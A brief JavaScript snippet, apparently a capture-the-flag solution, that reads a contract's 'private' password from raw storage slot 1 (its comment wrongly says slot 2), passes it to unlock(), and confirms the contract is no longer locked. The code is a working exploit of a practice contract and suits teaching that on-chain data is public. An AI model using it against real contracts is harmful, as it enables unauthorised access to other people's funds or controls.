//finds the stored bytes32 variable at slot 2.
const password = await web3.eth.getStorageAt(contract.address, 1);
contract.unlock(password);

//checked if it is locked: false
await contract.locked()